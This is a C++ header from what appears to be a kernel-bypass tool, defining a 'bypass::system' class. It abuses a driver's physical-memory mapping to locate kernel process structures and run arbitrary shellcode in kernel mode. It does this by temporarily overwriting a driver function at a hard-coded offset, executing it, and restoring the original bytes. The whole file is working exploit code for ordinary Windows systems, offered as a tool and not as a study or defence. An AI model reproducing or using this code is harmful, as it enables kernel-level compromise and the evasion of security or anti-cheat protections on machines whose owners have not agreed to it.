#pragma once
#include <memory>
#include <array>
#include "driver.hpp"
#include "native.hpp"

namespace bypass
{
	class system
	{
	private:
		using driver_t = std::shared_ptr<driver>;
	public:
		explicit system(driver_t driver);

		native::virt_addr get_eprocess(native::pid_t pid) const;
		native::virt_addr get_dirbase(native::virt_addr eprocess) const;
		native::virt_addr get_module_base(native::virt_addr eprocess) const;

		template <std::size_t S>
		void execute_shellcode(std::array<uint8_t, S> shellcode) const
		{
			// could make trampoline hook and write shellcode somewhere else to remedy the size issue

			if (shellcode.size() > 0x134)
				util::exception("[!] shellcode larger than function");

			auto system_eproc = get_eprocess(4);
			auto system_dirbase = get_dirbase(system_eproc);

			auto smartfan_virt = get_driver_base(DRIVER_NAME) + 0x2A14;
			auto smartfan_phys = _driver->translate_linear_address(system_dirbase, smartfan_virt);
			auto smartfan_mapped = _driver->map_physical(smartfan_phys, static_cast<std::uint32_t>(shellcode.size()));

			// save original function
			auto o_shellcode = shellcode;
			memcpy(o_shellcode.data(), reinterpret_cast<void*>(smartfan_mapped), o_shellcode.size());

			// overwrite function and execute
			memcpy(reinterpret_cast<void*>(smartfan_mapped), shellcode.data(), shellcode.size());
			_driver->run_smartfan();

			// restore function and unmap physmem
			memcpy(reinterpret_cast<void*>(smartfan_mapped), o_shellcode.data(), o_shellcode.size());
			_driver->unmap_physical(smartfan_mapped);
		}
	private:
		driver_t _driver;

		native::virt_addr get_kernel_base() const;
		native::virt_addr get_driver_base(std::string_view name) const;
		native::virt_addr find_kernel_proc(std::string_view name) const;
	};
}